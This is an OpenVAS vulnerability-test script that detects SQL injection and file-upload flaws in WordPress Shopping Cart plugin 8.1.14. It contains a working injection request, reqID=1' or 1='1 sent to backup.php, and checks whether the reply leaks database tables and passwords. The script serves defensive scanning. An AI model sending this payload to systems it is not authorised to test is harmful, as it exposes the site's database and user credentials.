###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_shopping_cart_plugin_mult_vuln.nasl 6115 2017-05-12 09:03:25Z teissa $
#
# WordPress Shopping Cart Plugin Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to gain sensitive
  information or to upload arbitrary PHP code and run it in the context of
  the Web server process.
  Impact Level: Application";

tag_affected = "WordPress Shopping Cart plugin version 8.1.14";
tag_insight = "Input passed via the 'reqID' parameter to backup.php, dbuploaderscript.php,
  exportsubscribers.php , emailimageuploaderscript.php and
  productuploaderscript.php is not properly sanitised which allows to
  execute SQL commands or upload files with arbitrary extensions to a folder
  inside the webroot.";
tag_solution = "Upgrade to the WordPress Shopping Cart Plugin 8.1.15 or later,
  For updates refer to http://wordpress.org/extend/plugins/levelfourstorefront/";
tag_summary = "This host is installed with WordPress Shopping Cart Plugin and is
  prone to multiple vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803208";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6115 $");
  script_bugtraq_id(57101);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-12 11:03:25 +0200 (Fri, 12 May 2017) $");
  script_tag(name:"creation_date", value:"2013-01-17 12:52:02 +0530 (Thu, 17 Jan 2013)");
  script_name("WordPress Shopping Cart Plugin Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51690");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80932");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119217/WordPress-Shopping-Cart-8.1.14-Shell-Upload-SQL-Injection.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
wpPort = 0;
url = "";
dir = "";

## Get HTTP Port
if(!wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:wpPort)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);

## Construct SQL attack request
url = dir + "/wp-content/plugins/levelfourstorefront/scripts/administration/" +
            "backup.php?reqID=1%27%20or%201=%271";

## Confirm exploit worked properly or not
if(http_vuln_check(port:wpPort, url:url, check_header:TRUE,
                   pattern:"CREATE TABLE",
                   extra_check: make_list('DROP TABLE', 'user_id',
                   'ClientID', 'Password')))
{
  security_message(port:wpPort);
  exit(0);
}
